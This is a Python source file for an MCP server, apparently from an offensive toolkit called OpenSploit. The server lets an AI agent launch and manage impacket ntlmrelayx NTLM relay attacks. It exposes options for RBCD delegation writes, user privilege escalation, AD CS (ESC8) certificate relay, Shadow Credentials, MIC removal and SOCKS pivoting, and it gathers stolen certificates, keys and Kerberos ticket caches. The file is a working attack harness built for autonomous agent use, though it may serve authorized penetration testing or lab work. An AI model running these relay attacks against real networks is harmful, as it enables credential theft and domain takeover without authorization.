#!/usr/bin/env python3
"""
OpenSploit MCP Server: impacket-relay

NTLM relay attacks via impacket ntlmrelayx. Listens for incoming NTLM
authentication and relays it to a target service (LDAP, LDAPS, MSSQL, HTTP, SMB).

Long-running service with start/status/stop process management.
Follows the chisel MCP server pattern for stateful process tracking.
"""

import asyncio
import glob
import os
import signal
import shutil
import socket
import subprocess
from typing import Any, Dict, Optional

from mcp_common.base_server import BaseMCPServer, ToolResult
from mcp_common.output_parsers import sanitize_output

NTLMRELAYX_BIN = "impacket-ntlmrelayx"


class ImpacketRelayServer(BaseMCPServer):
    """MCP server for ntlmrelayx NTLM relay attacks."""

    def __init__(self):
        super().__init__(
            name="impacket-relay",
            description="NTLM relay attacks via ntlmrelayx",
            version="1.0.0",
        )

        # Track running relay processes: {id: {"process": proc, ...}}
        self.relays: Dict[str, Dict[str, Any]] = {}
        self.next_id = 1

        self.register_method(
            name="start",
            description="Start ntlmrelayx NTLM relay listener. Relays captured NTLM auth to a target service.",
            params={
                "target": {
                    "type": "string",
                    "required": True,
                    "description": "Relay target URL (e.g., 'ldaps://DC01.pirate.htb', 'smb://10.10.10.1')",
                },
                "listen_port": {
                    "type": "integer",
                    "default": 80,
                    "description": "Port to listen on for incoming NTLM auth (HTTP=80, SMB=445)",
                },
                "smb2support": {
                    "type": "boolean",
                    "default": True,
                    "description": "Enable SMB2 support for incoming connections",
                },
                "delegate_access": {
                    "type": "boolean",
                    "default": False,
                    "description": "Write RBCD delegation after successful relay (--delegate-access)",
                },
                "escalate_user": {
                    "type": "string",
                    "description": "Account to escalate privileges for (--escalate-user)",
                },
                "remove_mic": {
                    "type": "boolean",
                    "default": False,
                    "description": "Remove MIC for cross-protocol relay (--remove-mic)",
                },
                "adcs": {
                    "type": "boolean",
                    "default": False,
                    "description": "Perform AD CS relay attack (ESC8). Requires adcs_template.",
                },
                "adcs_template": {
                    "type": "string",
                    "description": "Certificate template for ADCS relay (use with adcs=true).",
                },
                "shadow_credentials": {
                    "type": "boolean",
                    "default": False,
                    "description": "Perform Shadow Credentials relay attack (adds msDS-KeyCredentialLink).",
                },
                "no_smb_server": {
                    "type": "boolean",
                    "default": False,
                    "description": "Disable the default SMB listener (use when only HTTP relay is needed).",
                },
                "no_http_server": {
                    "type": "boolean",
                    "default": False,
                    "description": "Disable the default HTTP listener (use when only SMB relay is needed).",
                },
                "socks": {
                    "type": "boolean",
                    "default": False,
                    "description": "Enable SOCKS proxy for relayed authenticated sessions.",
                },
                "additional_args": {
                    "type": "string",
                    "description": "Additional ntlmrelayx arguments as a single string",
                },
                "timeout": {
                    "type": "integer",
                    "default": 300,
                    "description": "Max time to keep relay running (seconds). Use status to check before timeout.",
                },
            },
            handler=self.start_relay,
        )

        self.register_method(
            name="status",
            description="Check status of a running relay and retrieve captured output",
            params={
                "relay_id": {
                    "type": "string",
                    "required": True,
                    "description": "Relay ID from start method",
                },
            },
            handler=self.relay_status,
        )

        self.register_method(
            name="stop",
            description="Stop a running relay and return final results",
            params={
                "relay_id": {
                    "type": "string",
                    "required": True,
                    "description": "Relay ID to stop",
                },
            },
            handler=self.stop_relay,
        )

        self.register_method(
            name="force_restart",
            description="Kill ALL relay processes and reset state. Use when relay is stuck or unresponsive.",
            params={},
            handler=self.force_restart,
        )

    # ── Error Classification ──────────────────────────────────────

    def _classify_relay_error(self, text: str) -> tuple:
        """Classify ntlmrelayx errors into structured error categories.

        Returns (error_class, retryable, suggestions).
        """
        if not text:
            return ("unknown", False, [])

        lower = text.lower()

        # Port already in use
        if "address already in use" in lower or "bind" in lower and "error" in lower:
            return ("network", False, [
                "Another process is using the relay port",
                "Use force_restart to kill all relays, or choose a different listen_port",
            ])

        # Connection refused to relay target
        if "connection refused" in lower or "errno 111" in lower:
            return ("network", True, [
                "Connection refused to relay target — verify target is reachable and service is running",
                "Check that the target URL protocol and port are correct (ldap://DC:389, ldaps://DC:636)",
            ])

        # Authentication / relay failures
        if "status_logon_failure" in lower or "invalid credentials" in lower:
            return ("auth", False, [
                "Relayed authentication was rejected by the target",
                "The captured credentials may not have access to the target service",
            ])
        if "status_access_denied" in lower or "access denied" in lower:
            return ("permission", False, [
                "Access denied on the relay target — insufficient privileges for the relayed account",
            ])

        # ADCS-specific errors
        if "certipy" in lower or "certificate" in lower and "error" in lower:
            return ("config", False, [
                "AD CS relay error — verify the certificate template name and CA accessibility",
            ])
        if "template" in lower and ("not found" in lower or "denied" in lower):
            return ("config", False, [
                "Certificate template not found or access denied — verify adcs_template value",
                "Use certipy to enumerate available templates",
            ])

        # Shadow Credentials errors
        if "keycredentiallink" in lower and ("error" in lower or "failed" in lower):
            return ("permission", False, [
                "Shadow Credentials relay failed — target may not support msDS-KeyCredentialLink",
                "Verify the relayed account has write access to the target's msDS-KeyCredentialLink attribute",
            ])

        # LDAP channel binding / signing
        if "ldap channel binding" in lower or "ldap signing" in lower or "strongerauthrequired" in lower:
            return ("config", False, [
                "LDAP signing or channel binding is enforced — relay to LDAP is blocked",
                "Try relaying to LDAPS with --remove-mic, or target a different service (SMB, MSSQL, HTTP)",
            ])

        # Timeout
        if "timed out" in lower or "timeout" in lower:
            return ("timeout", True, [
                "Relay operation timed out — increase timeout or verify network connectivity",
            ])

        # Binary not found
        if "not found" in lower and "ntlmrelayx" in lower:
            return ("config", False, [
                "ntlmrelayx binary not found — ensure impacket-scripts is installed in the container",
            ])

        # Generic fallback
        if "[-]" in text or "error" in lower:
            return ("unknown", False, [])

        return ("unknown", False, [])

    # ── Helpers ─────────────────────────────────────────────────

    def _get_next_id(self) -> str:
        relay_id = f"relay-{self.next_id}"
        self.next_id += 1
        return relay_id

    def _is_port_available(self, port: int) -> bool:
        """Check if a port is available for binding."""
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.bind(("0.0.0.0", port))
                return True
        except OSError:
            return False

    def _parse_relay_output(self, output: str) -> Dict[str, Any]:
        """Parse ntlmrelayx output for success indicators."""
        result = {
            "connections": [],
            "relay_succeeded": False,
            "delegation_written": False,
            "adcs_succeeded": False,
            "shadow_credentials_succeeded": False,
            "errors": [],
        }

        for line in output.split("\n"):
            stripped = line.strip()
            if not stripped:
                continue

            lower = stripped.lower()
            is_error_line = stripped.startswith("[-]") or "failed" in lower

            # Connection received
            if "connection from" in lower:
                result["connections"].append(stripped)
            # Relay success indicators (only on non-error lines)
            if not is_error_line and any(ind in lower for ind in [
                "authenticating against",
                "modify_add",
                "written successfully",
                "delegation rights modified",
                "target user found",
            ]):
                result["relay_succeeded"] = True
            # RBCD delegation
            if not is_error_line and "delegation" in lower and "written" in lower:
                result["delegation_written"] = True
            # ADCS relay success (certificate obtained)
            if not is_error_line and "certificate" in lower and ("generated" in lower or "saved" in lower or "obtained" in lower):
                result["adcs_succeeded"] = True
                result["relay_succeeded"] = True
            # Shadow Credentials success
            if not is_error_line and "keycredentiallink" in lower and ("added" in lower or "written" in lower or "updated" in lower):
                result["shadow_credentials_succeeded"] = True
                result["relay_succeeded"] = True
            # Errors
            if stripped.startswith("[-]") or "error" in lower:
                result["errors"].append(stripped)

        return result

    def _get_output_file(self, relay_id: str) -> str:
        """Return the path to the output file for a relay."""
        return f"/tmp/{relay_id}.log"

    # ── Method Handlers ────────────────────────────────────────

    async def start_relay(
        self,
        target: str,
        listen_port: int = 80,
        smb2support: bool = True,
        delegate_access: bool = False,
        escalate_user: Optional[str] = None,
        remove_mic: bool = False,
        adcs: bool = False,
        adcs_template: Optional[str] = None,
        shadow_credentials: bool = False,
        no_smb_server: bool = False,
        no_http_server: bool = False,
        socks: bool = False,
        additional_args: Optional[str] = None,
        timeout: int = 300,
    ) -> ToolResult:
        """Start ntlmrelayx relay listener."""
        # Clean up stale relays whose processes have already exited (REQ-RES-006)
        cleaned = self._cleanup_stale_relays()
        if cleaned:
            self.logger.info(f"Cleaned up {cleaned} stale relay(s) before starting new one")

        # Check port availability
        if not self._is_port_available(listen_port):
            return ToolResult(
                success=False,
                error=f"Port {listen_port} is already in use. Choose a different port or stop the existing listener.",
                error_class="network",
                retryable=False,
                suggestions=["Use force_restart to kill all relays, or choose a different listen_port"],
            )

        cmd = [NTLMRELAYX_BIN, "-t", target]

        if smb2support:
            cmd.append("-smb2support")
        if delegate_access:
            cmd.append("--delegate-access")
        if escalate_user:
            cmd.extend(["--escalate-user", escalate_user])
        if remove_mic:
            cmd.append("--remove-mic")
        if adcs:
            cmd.append("--adcs")
        if adcs_template:
            cmd.extend(["--template", adcs_template])
        if shadow_credentials:
            cmd.append("--shadow-credentials")
        if no_http_server:
            cmd.append("--no-http-server")
        if socks:
            cmd.append("-socks")

        # Set listen port based on protocol
        if listen_port == 445:
            cmd.extend(["--smb-port", str(listen_port)])
        elif listen_port != 80:
            cmd.extend(["--http-port", str(listen_port)])

        # Auto-disable SMB listener when not on port 445 (avoids port conflict),
        # unless socks mode is enabled (socks needs SMB for initial auth)
        if no_smb_server:
            cmd.append("--no-smb-server")
        elif listen_port != 445 and not socks and "--no-smb-server" not in cmd:
            cmd.append("--no-smb-server")

        if additional_args:
            cmd.extend(additional_args.split())

        relay_id = self._get_next_id()
        self.logger.info(f"Starting {relay_id}: {' '.join(cmd)}")

        try:
            # Use subprocess.Popen (not asyncio.create_subprocess_exec) with output
            # redirected to a file. asyncio subprocess management caused event loop
            # deadlocks when the MCP server processed multiple concurrent requests
            # while a relay process was running (Pirate engagement bug).
            output_file = self._get_output_file(relay_id)
            output_fh = open(output_file, "w+")

            proc = subprocess.Popen(
                cmd,
                stdin=subprocess.PIPE,  # own pipe: doesn't steal MCP stdin, doesn't EOF
                stdout=output_fh,
                stderr=subprocess.STDOUT,
                start_new_session=True,  # prevent SIGTERM from propagating
            )

            # Wait briefly to detect immediate failures
            await asyncio.sleep(3)

            exit_code = proc.poll()
            if exit_code is not None:
                output_fh.seek(0)
                combined = output_fh.read()
                output_fh.close()
                try:
                    os.unlink(output_file)
                except OSError:
                    pass
                error_class, retryable, suggestions = self._classify_relay_error(combined)
                return ToolResult(
                    success=False,
                    error=f"ntlmrelayx exited immediately (code {exit_code}): {combined[:500]}",
                    raw_output=sanitize_output(combined),
                    error_class=error_class,
                    retryable=retryable,
                    suggestions=suggestions,
                )

            # Read initial output from file
            output_fh.seek(0)
            initial_output = output_fh.read()

            self.relays[relay_id] = {
                "process": proc,
                "pid": proc.pid,
                "target": target,
                "listen_port": listen_port,
                "delegate_access": delegate_access,
                "output_file": output_file,
                "output_fh": output_fh,
                "last_read_pos": output_fh.tell(),
            }

            return ToolResult(
                success=True,
                data={
                    "relay_id": relay_id,
                    "pid": proc.pid,
                    "target": target,
                    "listen_port": listen_port,
                    "status": "running",
                    "delegate_access": delegate_access,
                },
                raw_output=sanitize_output(initial_output) if initial_output else f"Started {relay_id} — listening on port {listen_port}, relaying to {target}",
            )

        except FileNotFoundError:
            return ToolResult(
                success=False,
                error=f"ntlmrelayx binary not found at {NTLMRELAYX_BIN}. Ensure impacket-scripts is installed.",
                error_class="config",
                retryable=False,
                suggestions=["ntlmrelayx binary not found — ensure impacket-scripts is installed in the container"],
            )
        except Exception as e:
            error_class, retryable, suggestions = self._classify_relay_error(str(e))
            return ToolResult(
                success=False,
                error=str(e),
                error_class=error_class,
                retryable=retryable,
                suggestions=suggestions,
            )

    async def relay_status(self, relay_id: str) -> ToolResult:
        """Check status of a running relay and retrieve captured output.

        Wraps the actual check in a 10-second timeout. If the relay process
        is stuck (zombie, blocked on I/O), force-kills it and returns
        status='stuck' instead of hanging indefinitely (REQ-RES-004).
        """
        if relay_id not in self.relays:
            return ToolResult(
                success=False,
                error=f"Relay {relay_id} not found. Use 'start' to create a relay.",
                error_class="params",
                retryable=False,
                suggestions=["Use 'start' to create a new relay before checking status"],
            )

        try:
            return await asyncio.wait_for(
                self._relay_status_inner(relay_id),
                timeout=10,
            )
        except asyncio.TimeoutError:
            self.logger.warning(f"status() timed out for {relay_id} — force-killing")
            await self._force_kill_relay(relay_id)
            return ToolResult(
                success=False,
                data={"relay_id": relay_id, "status": "stuck", "action": "force-killed"},
                raw_output="Relay process was stuck and has been force-killed.",
                error_class="timeout",
                retryable=False,
                suggestions=["Relay process was stuck — use force_restart if it recurs, or start a new relay"],
            )

    async def _relay_status_inner(self, relay_id: str) -> ToolResult:
        """Inner status check — called within a timeout wrapper."""
        info = self.relays[relay_id]
        proc = info["process"]

        # Read all output from the log file (non-blocking, no pipe interaction)
        fh = info["output_fh"]
        fh.seek(0)
        all_output = fh.read()

        # Read new output since last status call
        last_pos = info.get("last_read_pos", 0)
        new_output = all_output[last_pos:]
        info["last_read_pos"] = len(all_output)

        # Check if process is still running (uses Popen.poll(), not asyncio)
        exit_code = proc.poll()
        if exit_code is not None:
            parsed = self._parse_relay_output(all_output)
            status = "completed" if parsed["relay_succeeded"] else "exited"

            error_class = None
            retryable = False
            suggestions = []
            error_msg = None
            if not parsed["relay_succeeded"] and parsed["errors"]:
                error_text = "\n".join(parsed["errors"])
                error_class, retryable, suggestions = self._classify_relay_error(error_text)
                error_msg = parsed["errors"][-1] if parsed["errors"] else None

            return ToolResult(
                success=parsed["relay_succeeded"],
                data={
                    "relay_id": relay_id,
                    "status": status,
                    "exit_code": exit_code,
                    "relay_succeeded": parsed["relay_succeeded"],
                    "delegation_written": parsed["delegation_written"],
                    "connections": parsed["connections"],
                    "errors": parsed["errors"],
                },
                raw_output=sanitize_output(all_output),
                error=error_msg,
                error_class=error_class,
                retryable=retryable,
                suggestions=suggestions,
            )

        # Process still running
        parsed = self._parse_relay_output(all_output)

        return ToolResult(
            success=True,
            data={
                "relay_id": relay_id,
                "status": "running",
                "pid": proc.pid,
                "relay_succeeded": parsed["relay_succeeded"],
                "delegation_written": parsed["delegation_written"],
                "connections": parsed["connections"],
                "errors": parsed["errors"],
            },
            raw_output=sanitize_output(new_output) if new_output else f"Relay {relay_id} running — no new output",
        )

    async def stop_relay(self, relay_id: str) -> ToolResult:
        """Stop a running relay and return final results.

        Uses SIGTERM → 5s wait → SIGKILL → 5s wait escalation.
        Overall 20s timeout to prevent indefinite hang (REQ-RES-005).
        """
        if relay_id not in self.relays:
            return ToolResult(
                success=False,
                error=f"Relay {relay_id} not found.",
                error_class="params",
                retryable=False,
                suggestions=["Relay may have already been stopped or never started"],
            )

        try:
            return await asyncio.wait_for(
                self._stop_relay_inner(relay_id),
                timeout=20,
            )
        except asyncio.TimeoutError:
            self.logger.error(f"stop() timed out for {relay_id} — force-killing")
            await self._force_kill_relay(relay_id)
            return ToolResult(
                success=True,
                data={
                    "relay_id": relay_id,
                    "status": "force-killed",
                    "relay_succeeded": False,
                    "delegation_written": False,
                    "connections": [],
                    "errors": ["stop() timed out, process force-killed"],
                },
                raw_output="Relay process did not stop cleanly within 20s. Force-killed.",
                error_class="timeout",
                retryable=False,
                suggestions=["Relay process was stuck — use force_restart if it recurs"],
            )

    async def _stop_relay_inner(self, relay_id: str) -> ToolResult:
        """Inner stop logic — called within a timeout wrapper."""
        info = self.relays[relay_id]
        proc = info["process"]

        # Kill process (SIGKILL — ntlmrelayx doesn't handle SIGTERM cleanly)
        if proc.poll() is None:
            self.logger.info(f"Sending SIGKILL to {relay_id} (pid {proc.pid})")
            try:
                os.kill(proc.pid, signal.SIGKILL)
            except ProcessLookupError:
                pass
            # Wait in a non-blocking loop (yields to event loop)
            for _ in range(50):  # 5 seconds max
                if proc.poll() is not None:
                    break
                await asyncio.sleep(0.1)
            if proc.poll() is None:
                self.logger.error(f"Relay {relay_id} did not die after SIGKILL")

        # Read final output from log file
        fh = info["output_fh"]
        fh.seek(0)
        final_output = fh.read()
        fh.close()
        # Clean up log file
        try:
            os.unlink(info["output_file"])
        except OSError:
            pass

        parsed = self._parse_relay_output(final_output)

        # Collect relay artifacts (certificates, keys, etc.)
        artifact_dir = "/session/relay"
        collected_artifacts = []
        try:
            os.makedirs(artifact_dir, exist_ok=True)
            for ext in ["*.pfx", "*.pem", "*.key", "*.cert", "*.ccache"]:
                for f in glob.glob(ext):
                    shutil.copy2(f, artifact_dir)
                    collected_artifacts.append(os.path.basename(f))
        except Exception as e:
            self.logger.warning(f"Artifact collection failed: {e}")
        if collected_artifacts:
            parsed["artifacts"] = collected_artifacts

        # Wait for port release (max 3s — don't block)
        listen_port = info.get("listen_port")
        if listen_port:
            for _ in range(3):
                if self._is_port_available(listen_port):
                    break
                await asyncio.sleep(1)

        del self.relays[relay_id]

        # Classify errors if the relay had failures
        error_class = None
        retryable = False
        suggestions = []
        if parsed["errors"]:
            error_text = "\n".join(parsed["errors"])
            error_class, retryable, suggestions = self._classify_relay_error(error_text)

        return ToolResult(
            success=True,
            data={
                "relay_id": relay_id,
                "status": "stopped",
                "relay_succeeded": parsed["relay_succeeded"],
                "delegation_written": parsed["delegation_written"],
                "connections": parsed["connections"],
                "errors": parsed["errors"],
            },
            raw_output=sanitize_output(final_output),
            error_class=error_class,
            retryable=retryable,
            suggestions=suggestions,
        )

    # ── Shared Helpers for Stuck/Stale Process Cleanup ─────────

    async def _force_kill_relay(self, relay_id: str) -> None:
        """Force-kill a single relay and remove it from tracking."""
        if relay_id not in self.relays:
            return
        info = self.relays[relay_id]
        proc = info["process"]
        if proc.poll() is None:
            try:
                os.kill(proc.pid, signal.SIGKILL)
            except ProcessLookupError:
                pass
            # Brief wait
            for _ in range(50):
                if proc.poll() is not None:
                    break
                await asyncio.sleep(0.1)
        # Clean up file handle and log file
        fh = info.get("output_fh")
        if fh and not fh.closed:
            fh.close()
        try:
            os.unlink(info.get("output_file", ""))
        except OSError:
            pass
        del self.relays[relay_id]

    def _cleanup_stale_relays(self) -> int:
        """Remove relay entries whose processes have already exited.

        Returns the number of stale entries cleaned up.
        """
        stale_ids = [
            rid for rid, info in self.relays.items()
            if info["process"].poll() is not None
        ]
        for rid in stale_ids:
            self.logger.info(f"Cleaning up stale relay {rid}")
            del self.relays[rid]
        return len(stale_ids)

    async def force_restart(self) -> ToolResult:
        """Kill ALL relay processes and reset state.

        Use when a relay is stuck or unresponsive and normal stop() fails.
        """
        killed = 0
        for rid, info in list(self.relays.items()):
            proc = info["process"]
            if proc.poll() is None:
                try:
                    os.kill(proc.pid, signal.SIGKILL)
                except ProcessLookupError:
                    pass
                killed += 1
                self.logger.info(f"Force-killed {rid} (pid {proc.pid})")
            # Clean up file handle and log file
            fh = info.get("output_fh")
            if fh and not fh.closed:
                fh.close()
            try:
                os.unlink(info.get("output_file", ""))
            except OSError:
                pass
        self.relays.clear()
        self.logger.info(f"force_restart: killed {killed} process(es), state cleared")
        return ToolResult(
            success=True,
            data={"killed": killed, "status": "cleared"},
            raw_output=f"Force-killed {killed} relay process(es). State cleared.",
        )


if __name__ == "__main__":
    ImpacketRelayServer.main()
